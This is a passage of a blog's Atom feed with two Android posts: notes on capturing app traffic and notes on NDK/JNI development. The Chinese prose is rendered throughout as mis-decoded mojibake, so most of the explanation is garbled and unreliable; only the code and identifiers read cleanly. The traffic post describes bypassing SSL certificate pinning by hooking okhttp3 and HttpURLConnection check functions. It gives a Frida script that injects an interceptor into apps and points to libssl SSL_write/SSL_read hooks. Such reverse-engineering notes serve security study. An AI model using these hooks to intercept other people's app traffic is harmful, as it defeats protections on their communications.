id="è‡ªå">è‡ªå</h3><p>ä»åŸºæœ¬æ¡†æ¶çŸ¥é“ï¼Œä¸»è¦ä¿¡æ¯åœ¨HttpURLConnectionå¯¹è±¡å’ŒURLæ„é€ å‡½æ•°ä¸­ï¼Œæ‰€ä»¥å¯ä»¥hookè¿™ä¸¤ä¸ªå‡½æ•°</p><p>æ³¨æ„HttpURLConnectionæ˜¯æŠ½è±¡ç±»ï¼Œæ‰€åœ¨çš„ç±»è·¯å¾„æ˜¯<code>com.android.okhttp.internal.huc.HttpURLConnectionImpl</code>(å¯ä»¥é€šè¿‡frida hookå’Œobjectionçš„æ‰“å°è¿”å›å€¼éªŒè¯)</p><h3 id="è¯ä¹¦éªŒè¯">è¯ä¹¦éªŒè¯</h3><p><img src="/posts/be4930f3.htm/image-20240703131207369.png" alt="image-20240703131207369"></p><p>HttpURLConnectionè¦å®ç°appå¯¹è¯ä¹¦çš„æ ¡éªŒéœ€è¦æ·»åŠ å¦‚ä¸‹éƒ¨åˆ†</p><p><img src="/posts/be4930f3.htm/image-20240703131532884.png" alt="image-20240703131532884"></p><p>åœ¨TrustManagerä¸­å®ç°éªŒè¯çš„ä»£ç é€»è¾‘ã€‚</p><p>è¿™é‡Œçš„sslContext.getSocketFactoryæ˜¯è¯ä¹¦æ£€æµ‹ æ·»åŠ è¿™ä¸ªçš„å‰ææ˜¯SSLContext.initçš„ç¬¬äºŒä¸ªå‚æ•°è¦å®šä¹‰ä¸€ä¸ªTrustMeanagerå¯¹è±¡,åœ¨è¿™ä¸ªé‡Œé¢å†™è¯ä¹¦æ ¡éªŒé€»è¾‘</p><p>ç„¶åå¯¹trustmanageré‡å†™æ–¹æ³•</p><p><img src="/posts/be4930f3.htm/image-20240703131616267.png" alt="image-20240703131616267"></p><p>å®¢æˆ·ç«¯æ ¡éªŒå®¢æˆ·ç«¯ä¸»è¦åœ¨checkServerTrustedå®ç°ï¼Œå…ˆä»appä¸­å†…ç½®çš„è¯ä¹¦ä¸­è·å¾—æ­£ç¡®çš„å…¬é’¥ï¼Œç„¶åå’Œå¾—åˆ°çš„è¯ä¹¦é“¾çš„è¯ä¹¦å…¬é’¥è¿›è¡Œæ¯”è¾ƒéªŒè¯ã€‚</p><p><img src="/posts/be4930f3.htm/image-20240703131651749.png" alt="image-20240703131651749"></p><p>åœ¨setHostnameVerifier(VERIFY)ä¹Ÿå¯ä»¥è¿›è¡Œè¯ä¹¦æ ¡éªŒæ“ä½œ</p><p><img src="/posts/be4930f3.htm/image-20240703142809363.png" alt="image-20240703142809363"></p><h3 id="è¯ä¹¦æ ¡éªŒç»•è¿‡">è¯ä¹¦æ ¡éªŒç»•è¿‡</h3><p>å°±æ˜¯hooké‚£ä¸¤ä¸ªå…³é”®å‡½æ•°å°±è¡ŒsetSSLSocketFactoryå’ŒsetHostnameVerifier</p><h2 id="okhttp3">okhttp3</h2><p>é¦–å…ˆxmlä¸­ç”³è¯·ä¸€ä¸ªå¯èƒ½ç½‘ç»œé€šä¿¡çš„æƒé™</p><p>ç„¶åapp/build.gradleä¸­çš„dependenciesèŠ‚ç‚¹ä¸­å¢åŠ å¯¹ç¬¬ä¸‰æ–¹åº“çš„å¼•ç”¨</p><p><code>implementation(&quot;com.squareup.okhttp3:okhttp:3.12.0&quot;)</code></p><p><strong>åŸºæœ¬æ¡†æ¶</strong></p><p><img src="/posts/be4930f3.htm/image-20240703145349726.png" alt="image-20240703145349726"></p><p>å¦‚æœè¦æ˜¯postè¯·æ±‚ æ·»åŠ å¦‚ä¸‹ä»£ç </p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">FormBody formBody = new FormBody.Builder().<span class="built_in">add</span>(<span class="string">&quot;name&quot;</span>ï¼Œ<span class="string">&quot;value&quot;</span>).<span class="built_in">add</span>()<span class="built_in">..</span>. .buidl();</span><br><span class="line"></span><br><span class="line">Requestä¸­.post(formBody)</span><br></pre></td></tr></table></figure><h3 id="æ‹¦æˆªå™¨">æ‹¦æˆªå™¨</h3><p>okhttpé€šè¿‡æ‹¦æˆªå™¨Interceptorå®Œæˆç›‘æ§ç®¡ç†ï¼Œé‡å†™å’Œé‡è¯•è¯·æ±‚ã€‚æ¯ä¸ªç½‘ç»œè¯·æ±‚æ— è®ºæ˜¯getè¿˜æ˜¯postéƒ½ä¼šç»è¿‡okhttpçš„æ‹¦æˆªå™¨ï¼Œæ‰€ä»¥Interceptoræ˜¯ä¸ªå¾ˆå¥½çš„hookç‚¹ï¼Œå¯ä»¥hookåˆ°è¯·æ±‚å’Œå“åº”ã€‚</p><p>ä½¿ç”¨æ‹¦æˆªå™¨ï¼š</p><p>åœ¨å®šä¹‰çš„å®¢æˆ·ç«¯å¯¹è±¡ä¸­æ·»åŠ <code>.addNetworkInterceptor(new xxxx())</code>å…¶ä¸­new xxx()æ˜¯åˆ›å»ºå®ç°Interceptorçš„ç±»å¯¹è±¡ã€‚</p><p>å½“ä¸€ä¸ªappæ²¡æœ‰ä½¿ç”¨Interceptorï¼Œé‚£å¦‚ä½•é€šè¿‡Interceptorè¿›è¡Œæ‰“å°è¯·æ±‚å“åº”å‘¢ï¼Ÿ æ“ä½œå¦‚ä¸‹</p><ul><li>æŠŠå®ç°Interceptorçš„ç±»æ”¾å…¥Android Studioä¸­ç¼–è¯‘æˆapkï¼Œæå–å‡ºæ¥é‡Œé¢çš„dexæ–‡ä»¶</li><li>ç¼–å†™fridaè„šæœ¬</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Java.<span class="title function_ invoke__">openClassFile</span>(<span class="string">&quot;/data/local/tmp/xxx.dex&quot;</span>).<span class="title function_ invoke__">load</span>();</span><br><span class="line"><span class="keyword">var</span> interceptor=Java.<span class="keyword">use</span>(<span class="string">&quot;æ‹¦æˆªå™¨ç±»è·¯å¾„&quot;</span>)ï¼›</span><br><span class="line"><span class="keyword">var</span> Builder=Java.<span class="keyword">use</span>(<span class="string">&quot;Buildç±»è·¯å¾„&quot;</span>);</span><br><span class="line">Builder.build.implementation=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> this.<span class="title function_ invoke__">addNetworkInterceptor</span>(interceptor.<span class="variable">$new</span>().<span class="title function_ invoke__">build</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="è¯ä¹¦æ£€æµ‹">è¯ä¹¦æ£€æµ‹</h3><p>åœ¨å®¢æˆ·ç«¯å¯¹è±¡å¤„æ·»åŠ å¦‚ä¸‹</p><p><img src="/posts/be4930f3.htm/image-20240703160957498.png" alt="image-20240703160957498"></p><p>å¦å¤–ä¸€ä¸ªæ ¡éªŒç‚¹ï¼šCertificatePinnerï¼Œè¯ä¹¦é”å®š</p><p><img src="/posts/be4930f3.htm/image-20240703180155577.png" alt="image-20240703180155577"></p><p>ä¸»è¦æ˜¯è°ƒç”¨è¿™ä¸ªCertificatePinnerç±»ä¸‹çš„checkæ–¹æ³•è¿›è¡Œè¯ä¹¦hashåŠ å¯†åçš„æ¯”è¾ƒæ ¡éªŒï¼Œç„¶åè¿™é‡Œçš„sslSocketFactoryå‚æ•°ä¸­çš„trustManageræ˜¯ç»è¿‡ä¸€ç³»åˆ—æ“ä½œ(å¦‚æ–°å»ºä¸€ä¸ªkeystoreå­˜æ”¾è¯ä¹¦ç­‰)åæ­£ç¡®çš„è¯ä¹¦çš„æ•°æ®ï¼Œåº”è¯¥å’ŒCertificatePinnerä¸­å‚æ•°çš„sha256è¿›è¡Œæ¯”è¾ƒæ ¡éªŒã€‚</p><h3 id="è¯ä¹¦ç»•è¿‡">è¯ä¹¦ç»•è¿‡</h3><p>ä¹Ÿå°±æ˜¯hookæ‰ä¸Šé¢æœ‰å…³è¯ä¹¦éªŒè¯çš„é‚£ä¸‰ä¸ªå‡½æ•°ã€‚</p><p>å½“å‡ºç°okhttp3æ··æ·†æ—¶å€™ï¼Œå°±éœ€è¦å…³æ³¨ä¸€äº›ç›¸å…³ç³»ç»Ÿå‡½æ•°ï¼Œç„¶åçœ‹ä»–çš„è°ƒç”¨æ ˆæ‰¾åˆ°å…³é”®çš„æ ¡éªŒå‡½æ•°ï¼Œå¦‚CertificatePinnerçš„checkå‡½æ•°</p><p>æ¯”è¾ƒå¸¸è§çš„å®ç°httpsç±»çš„å„è‡ªè¯ä¹¦æ ¡éªŒæ–¹å¼ï¼š</p><p><img src="/posts/be4930f3.htm/905443_VRDJKTB2QDRSNQ6.png" alt="image-20211205163031752"></p><h2 id="åŸºäºxposedçš„ä¸¤ä¸ªç»•è¿‡ssl-pinningçš„æ¨¡å—">åŸºäºxposedçš„ä¸¤ä¸ªç»•è¿‡ssl pinningçš„æ¨¡å—</h2><p><img src="/posts/be4930f3.htm/905443_GQTKJ7GVBKAX8FB.png" alt="img"></p><h2 id="jniå±‚SSLç³»ç»Ÿæºç è‡ªå">jniå±‚SSLç³»ç»Ÿæºç è‡ªå</h2><p>hookç‚¹æœ‰ä¸¤ä¸ªéƒ¨åˆ†ï¼Œå¦‚ä¸‹<img src="/posts/be4930f3.htm/image-20240704210621418.png" alt="image-20240704210621418"></p><p>libssl.soä¸­çš„SSL_writeå’ŒSSL_readã€‚è¿™ä¸¤ä¸ªæ˜¯nativeå±‚å®ç°çš„å‡½æ•°ï¼Œå‚æ•°bufæ˜¯æœªç»è¿‡æ“ä½œçš„è¯·æ±‚æ•°æ®</p><p>libc.soçš„writeå’Œreadä¸­çš„bufå‚æ•°åˆ™æ˜¯ç»è¿‡å¤„ç†åçš„è¯·æ±‚æ•°æ®ï¼Œå¯ä»¥é€šè¿‡è¿™ä¸ªæ‰“å°è°ƒç”¨æ ˆæ‰¾åˆ°SSL_writeå’ŒSSL_readæˆ–è€…appè‡ªå®ç°çš„å®ç°ç›¸åº”åŠŸèƒ½çš„å‡½æ•°ã€‚</p>]]></content>
    
    
    <summary type="html">ğŸAndroidæŠ“åŒ…æŠ€æœ¯çš„æ•´ç†ä¸å½’çº³</summary>
    
    
    
    <category term="AndroidæŠ“åŒ…" scheme="https://zxk1ng.github.io/categories/Android%E6%8A%93%E5%8C%85/"/>
    
    
    <category term="Androidé€†å‘" scheme="https://zxk1ng.github.io/tags/Android%E9%80%86%E5%90%91/"/>
    
    <category term="æŠ“åŒ…" scheme="https://zxk1ng.github.io/tags/%E6%8A%93%E5%8C%85/"/>
    
  </entry>
  
  <entry>
    <title>NDKå­¦ä¹ </title>
    <link href="https://zxk1ng.github.io/posts/f0867805.html"/>
    <id>https://zxk1ng.github.io/posts/f0867805.html</id>
    <published>2025-01-15T07:00:23.000Z</published>
    <updated>2025-01-15T07:14:39.051Z</updated>
    
    <content type="html"><![CDATA[<h1>NDK</h1><p>linkerï¼šè‡ªå®šä¹‰çš„soè§£æç³»ç»Ÿï¼Œå¯ä»¥ç”¨è‡ªå®šä¹‰çš„linkerç³»ç»Ÿæ¥è§£æä¿®æ”¹soç»“æ„çš„soæ–‡ä»¶</p><p>CMakeï¼šä¸€æ¬¾å¤–éƒ¨æ„å»ºå·¥å…·ã€‚æŒ‡å¯¼soç¼–è¯‘</p><p>LLDBï¼šAndroidStudioç”¨äºè°ƒå¼åŸç”Ÿä»£ç çš„è°ƒè¯•ç¨‹åº</p><p>NDK ,CMake ã€ LLDBçš„ä½œç”¨ï¼š<a href="https://developer.android.com/ndk/guides">https://developer.android.com/ndk/guides</a></p><p>ABIä¸æŒ‡ä»¤é›†ï¼š<a href="https://developer.android.com/ndk/guides/abis">https://developer.android.com/ndk/guides/abis</a></p><h2 id="NDKä¸Javaå·¥ç¨‹çš„åŒºåˆ«">NDKä¸Javaå·¥ç¨‹çš„åŒºåˆ«</h2><ul><li><p>Javaä»£ç ä¸­åŠ è½½soå’Œå£°æ˜æ‰€éœ€è¦ä½¿ç”¨çš„soä¸­çš„å‡½æ•°</p></li><li><p>ç¼–å†™CMakeLists.txtå’ŒCæ–‡ä»¶</p></li><li><p>build.gradleä¸­æ·»åŠ ä¸€äº›ä»£ç </p><figure class="highlight fsharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">defaultConfig</span> &#123;</span><br><span class="line">       ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚</span><br><span class="line">        <span class="keyword">externalNativeBuild</span> &#123;</span><br><span class="line">            <span class="keyword">cmake</span> &#123;</span><br><span class="line">                cppFlags &#x27;<span class="operator">-</span>std<span class="operator">=</span>c<span class="operator">++</span><span class="number">11</span>&#x27;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">ndk</span>&#123;</span><br><span class="line">        abiFilters&#x27;armeabi<span class="operator">-</span>v7a<span class="string">&#x27;,&#x27;</span>arm64<span class="operator">-</span>v8a<span class="string">&#x27;,&#x27;</span>x86<span class="string">&#x27;,&#x27;</span>x86_64&#x27;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">externalNativeBuild</span> &#123;</span><br><span class="line">        <span class="keyword">cmake</span> &#123;</span><br><span class="line">            path file(<span class="symbol">&#x27;src</span><span class="operator">/</span>main<span class="operator">/</span>cpp<span class="operator">/</span>CMakeLists.txt&#x27;)</span><br><span class="line">            version &#x27;<span class="number">3.22</span><span class="number">.1</span>&#x27;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li></ul><p><img src="/posts/f0867805.htm/image-20240327192718501.png" alt="image-20240327192718501"></p><p><strong>add_definitions(â€œ-fvisibility=hiddenâ€)</strong> å»æ‰ç¬¦å·è¡¨</p><p><code>__attribute((__annotate__(&quot;fla&quot;))</code>å¯¹æŒ‡å®šå‡½æ•°flaæ··æ·†</p><p><code>__attribute__((visibility(&quot;default&quot;)))</code>æ˜¾ç¤ºåœ¨å¯¼å‡ºè¡¨ä¸­</p><h2 id="ç¬¬ä¸€ä¸ªNDKå·¥ç¨‹">ç¬¬ä¸€ä¸ªNDKå·¥ç¨‹</h2><ul><li><p>nativeå‡½æ•°çš„å£°æ˜<br>å£°æ˜å½¢å¼</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> String <span class="title function_">stringFromJNI</span><span class="params">()</span>;</span><br></pre></td></tr></table></figure></li><li><p>JNIå‡½æ•°çš„é™æ€æ³¨å†Œè§„åˆ™<br>é™æ€æ³¨å†Œåå‡½æ•°åå­—ä¸ºï¼š</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Java_åŒ…å<span class="literal">_</span>ç±»å<span class="literal">_</span>å‡½æ•°å</span><br></pre></td></tr></table></figure></li><li><p>extern â€œCâ€ JNIEXPORT jstring JNICALL<br>extern  â€œCâ€ ==&gt; ä»¥ç¼–è¯‘cä»£ç çš„å½¢å¼æ¥ç¼–è¯‘ï¼Œé˜²æ­¢åŠ ä¸Šå…¶ä»–çš„ä¿®é¥°ç¬¦ï¼Œç¬¦å·ç­‰ã€‚<br>JNIEXPORT ==&gt; <strong>attribute</strong> ((visibility (â€œdefaultâ€))) è®©å‡½æ•°ååœ¨å¯¼å‡ºè¡¨ä¸­å‡ºç°ï¼Œé™æ€æ³¨å†Œåå­—ä¸€å®šè¦å‡ºç°åœ¨å¯¼å‡ºè¡¨<br>jstring ==&gt; è¿”å›å€¼</p></li><li><p>æŒ‡å®šç¼–è¯‘åsoçš„åå­—</p><p>ä¿®æ”¹å¦‚ä¸‹ä½ç½®å³å¯ï¼š<br><img src="/posts/f0867805.htm/image-20240204144200776.png" alt="image-20240204144200776"></p></li></ul><p><img src="/posts/f0867805.htm/image-20240204144230665.png" alt="image-20240204144230665"></p><p><img src="/posts/f0867805.htm/image-20240204144308333.png" alt="image-20240204144308333"></p><h2 id="soä¸­å¸¸ç”¨çš„Logè¾“å‡º">soä¸­å¸¸ç”¨çš„Logè¾“å‡º</h2><p>åœ¨ASä¸­ï¼Œåœ¨.cppæ–‡ä»¶ä¸­å¯ä»¥é€šè¿‡ä»¥ä¸‹å½¢å¼è¿›è¡Œè¾“å‡ºï¼š</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">å¤´æ–‡ä»¶ï¼š</span><br><span class="line">#include &lt;android/<span class="keyword">log</span>.h&gt;</span><br><span class="line"></span><br><span class="line">#define <span class="built_in">TAG</span> <span class="string">&quot;zxk1ng&quot;</span> </span><br><span class="line">#define LOGD(<span class="params">...</span>) __android_log_print(ANDROID_LOG_DEBUG, <span class="built_in">TAG</span>, __VA_ARGS__) ; </span><br><span class="line">#define LOGI(<span class="params">...</span>) __android_log_print(ANDROID_LOG_INFO, <span class="built_in">TAG</span>, __VA_ARGS__) ; </span><br><span class="line">#define LOGE(<span class="params">...</span>) __android_log_print(ANDROID_LOG_ERROR, <span class="built_in">TAG</span>, __VA_ARGS__);</span><br><span class="line"></span><br><span class="line">LOGD(<span class="string">&quot;JNI_native_xxx %d %d&quot;</span>,<span class="number">100</span>,<span class="number">200</span>);</span><br><span class="line">ç­‰ä»·äº</span><br><span class="line">__android_log_print(ANDROID_LOG_DEBUG,<span class="string">&quot;zxk1ng&quot;</span>,<span class="string">&quot;JNI_native_xxx %d %d&quot;</span>,<span class="number">100</span>,<span class="number">200</span>);</span><br></pre></td></tr></table></figure><h2 id="JNI-OnLoadçš„å®šä¹‰">JNI_OnLoadçš„å®šä¹‰</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">JNIEXPORT jint <span class="title function_">JNI_OnLoad</span><span class="params">(JavaVM *vm,<span class="keyword">void</span> *reserved)</span>&#123;</span><br><span class="line">    JNIEnv *env = nullptr;</span><br><span class="line">    <span class="keyword">if</span>(vm-&gt;GetEnv((<span class="keyword">void</span> **)&amp;env,JNI_VERSION_1_6)!=JNI_OK)&#123;</span><br><span class="line">        LOGD(<span class="string">&quot;GetEnv failed&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> JNI_VERSION_1_6; <span class="comment">//è¿”å›jniç‰ˆæœ¬å€¼</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸€ä¸ªsoä¸­å¯ä»¥ä¸å®šä¹‰JNI_OnLoadï¼Œä¸€æ—¦å®šä¹‰äº†JNI_OnLoadï¼Œåœ¨soè¢«åŠ è½½çš„æ—¶å€™ä¼šè‡ªåŠ¨æ‰§è¡Œ</p><p>å¿…é¡»è¿”å›JNIç‰ˆæœ¬ï¼ŒJNI_VERSION_1_6</p><h2 id="JavaVM">JavaVM</h2><p>JavaVMæ¯ä¸ªè¿›ç¨‹ä¸­åªæœ‰ä¸€ä»½</p><p>JavaVMæ˜¯ä¸€ä¸ªç»“æ„ä½“ï¼Œå…¶ä¸­æœ‰ä¸¤ä¸ªé‡è¦æˆå‘˜</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//å­çº¿ç¨‹è·å¾—envç¯å¢ƒ </span></span><br><span class="line">jint <span class="title function_">AttachCurrentThread</span><span class="params">(JNIEnv** p_env, <span class="keyword">void</span>* thr_args)</span></span><br><span class="line">  &#123; <span class="keyword">return</span> functions-&gt;AttachCurrentThread(<span class="built_in">this</span>, p_env, thr_args); &#125;</span><br><span class="line"><span class="comment">//ä¸»çº¿ç¨‹ä¸­è·å¾—envç¯å¢ƒ    </span></span><br><span class="line">jint <span class="title function_">GetEnv</span><span class="params">(<span class="keyword">void</span>** env, jint version)</span></span><br><span class="line">  &#123; <span class="keyword">return</span> functions-&gt;GetEnv(<span class="built_in">this</span>, env, version); &#125;</span><br></pre></td></tr></table></figure><h3 id="JavaVMè·å–æ–¹å¼">JavaVMè·å–æ–¹å¼</h3><p>1ï¼‰JNI_OnLoadå’ŒJNI_OnUnLoadçš„ç¬¬ä¸€ä¸ªå‚æ•°</p><p>2ï¼‰env-&gt;GetJavaVM</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">JNIEXPORT </span><span class="keyword">jint </span><span class="keyword">JNI_OnLoad(JavaVM* </span>vm, void* reserved);</span><br><span class="line"><span class="keyword">JNIEXPORT </span>void <span class="keyword">JNI_OnUnload(JavaVM* </span>vm, void* reserved);</span><br><span class="line"></span><br><span class="line"><span class="keyword">JavaVM </span>*<span class="keyword">jvm;</span></span><br><span class="line"><span class="keyword"></span>env-&gt;GetJavaVM(&amp;<span class="keyword">jvm);</span></span><br><span class="line"><span class="keyword"></span>LOGD(<span class="string">&quot;JavaVM: %p&quot;</span>,<span class="keyword">jvm);</span></span><br></pre></td></tr></table></figure><h2 id="JNIEnv">JNIEnv</h2><p>JNIEnvæ¯ä¸ªçº¿ç¨‹ä¸­éƒ½æœ‰ä¸€ä»½</p><h3 id="JNIEnvè·å–">JNIEnvè·å–</h3><ul><li>å‡½æ•°é™æ€/åŠ¨æ€æ³¨å†Œä¼ çš„ç¬¬ä¸€ä¸ªå‚æ•°</li><li>vm-&gt;GetEnv</li><li>globalVM-&gt;AttachCurrentThread å­çº¿ç¨‹è·å¾—env</li></ul><h2 id="SOå‡½æ•°æ³¨å†Œ">SOå‡½æ•°æ³¨å†Œ</h2><p>1ï¼‰JNIå‡½æ•°çš„é™æ€æ³¨å†Œå¿…é¡»éµå¾ªä¸€å®šçš„å‘½åè§„åˆ™ï¼Œä¸€ èˆ¬ æ˜¯ Java_åŒ… å _ ç±»å _ æ–¹æ³•å</p><p>ç³»ç»Ÿä¼šé€šè¿‡dlopenåŠ è½½å¯¹åº”çš„soï¼Œé€šè¿‡dlsymæ¥è·å–æŒ‡å®šåå­—çš„å‡½æ•°åœ°å€ï¼Œç„¶åè°ƒç”¨é™æ€æ³¨å†Œçš„jniå‡½æ•°ï¼Œ é™æ€æ³¨å†Œå‡½æ•°å¿…ç„¶åœ¨å¯¼å‡ºè¡¨é‡Œ</p><p>2ï¼‰JNIå‡½æ•°çš„åŠ¨æ€æ³¨å†Œé€šè¿‡ env-&gt;RegisterNatives æ³¨å†Œå‡½æ•°ï¼Œé€šå¸¸åœ¨ JNI_OnLoadä¸­æ³¨å†Œã€‚</p><p>JNINativeMethod  ç»“æ„ä½“ å†…å®¹å¦‚ä¸‹</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* name;   javaå±‚å‡½æ•°å</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* signature;  å‡½æ•°ç­¾å ç”±å‚æ•°ç±»å‹è¿”å›ç±»å‹å†³å®š</span><br><span class="line">    <span class="type">void</span>*       fnPtr;   å‡½æ•°æŒ‡é’ˆ</span><br><span class="line">&#125; JNINativeMethod;</span><br></pre></td></tr></table></figure><p>å¯ä»¥ç»™<strong>åŒä¸€ä¸ªJavaå‡½æ•°</strong>æ³¨å†Œå¤šä¸ªnativeå‡½æ•°ï¼Œä»¥æœ€åä¸€æ¬¡ä¸ºå‡†</p><p>ä¸€ä¸ªç®€å•çš„åŠ¨æ€æ³¨å†Œä¾‹å­</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//.javaä¸­è°ƒç”¨å’Œå£°æ˜</span></span><br><span class="line">Log.d(<span class="string">&quot;zxk1ng&quot;</span>,encodeFromC(<span class="string">&quot;java&quot;</span>,<span class="number">100</span>,<span class="number">64412923.</span>getBytes()));</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> String <span class="title function_">stringFromJNI2</span><span class="params">(String a,<span class="type">int</span> b,<span class="type">byte</span>[] c)</span>;</span><br><span class="line"><span class="comment">//.cppä¸­</span></span><br><span class="line">jstring <span class="title function_">encodeFromC</span><span class="params">(JNIEnv *env,jobject,jstring,jint,jbyteArray)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> env-&gt;NewStringUTF(<span class="string">&quot;zxk1ng&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">jclass</span> <span class="variable">MainActivityClazz</span> <span class="operator">=</span> env-&gt;FindClass(<span class="string">&quot;com/example/ndk_demo/MainActivity&quot;</span>); JNINativeMethod methods[] = &#123; </span><br><span class="line">  <span class="comment">//public native String encode(int i,String str,byte[] byt); </span></span><br><span class="line">  &#123;<span class="string">&quot;stringFromJNI2&quot;</span>,<span class="string">&quot;(Ljava/lang/String;I[B)Ljava/lang/String;&quot;</span>, (<span class="keyword">void</span> *)encodeFromC&#125;, </span><br><span class="line">&#125;; </span><br><span class="line">env-&gt;RegisterNatives(MainActivityClazz,methods,sizeof(methods)/sizeof(JNINativeMethod)</span><br><span class="line"></span><br><span class="line"><span class="comment">//RegisterNativesç»“æ„å¦‚ä¸‹ï¼š                    </span></span><br><span class="line">jint <span class="title function_">RegisterNatives</span><span class="params">(jclass clazz, const JNINativeMethod* methods,jint nMethods)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="å¤šä¸ªcppæ–‡ä»¶ç¼–è¯‘æˆä¸€ä¸ªso">å¤šä¸ªcppæ–‡ä»¶ç¼–è¯‘æˆä¸€ä¸ªso</h2><p>åªéœ€è¦ä¿®æ”¹CMakeLists.txt<img src="/posts/f0867805.htm/image-20240204191525854.png" alt="image-20240204191525854"></p><ul><li>ä¸¤ä¸ªcppå‡½æ•°å¦‚ä½•ç›¸äº’ä½¿ç”¨â€“åœ¨åŒä¸€ä¸ªsoæ–‡ä»¶ä¸‹<br>é¦–å…ˆåœ¨ä¸€ä¸ªcppä¸­å£°æ˜å‡½æ•°ï¼Œæ‰èƒ½ä½¿ç”¨å¦ä¸€ä¸ªcppçš„å‡½æ•°ã€‚</li></ul><h2 id="ç¼–è¯‘å¤šä¸ªsoæ–‡ä»¶">ç¼–è¯‘å¤šä¸ªsoæ–‡ä»¶</h2><p>å¤šä¸ªsoè‚¯å®šå¯¹åº”å¤šä¸ªcppæ–‡ä»¶</p><p>ç¼–è¯‘å¤šä¸ªsoåªéœ€è¦æ·»åŠ å¦‚ä¸‹ï¼š<br><img src="/posts/f0867805.htm/image-20240204194227976.png" alt="image-20240204194227976"></p><p><img src="/posts/f0867805.htm/image-20240204194330575.png" alt="image-20240204194330575"></p><h2 id="soè·¯å¾„çš„åŠ¨æ€è·å–">soè·¯å¾„çš„åŠ¨æ€è·å–</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Log.d(<span class="string">&quot;zxk1ng&quot;</span>,getPath(getApplicationContext()));</span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">getPath</span><span class="params">(Context cxt)</span>&#123;</span><br><span class="line">    <span class="type">PackageManager</span> <span class="variable">pm</span> <span class="operator">=</span> cxt.getPackageManager(); </span><br><span class="line">    List&lt;PackageInfo&gt; pkgList = pm.getInstalledPackages(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(pkgList == <span class="literal">null</span> || pkgList.size() == <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">for</span>(PackageInfo pi : pkgList)&#123;</span><br><span class="line">        <span class="keyword">if</span> (pi.applicationInfo.nativeLibraryDir.startsWith(<span class="string">&quot;/data/app/&quot;</span>) &amp;&amp; pi. packageName.startsWith(<span class="string">&quot;com.example.ndk_demo&quot;</span>)) 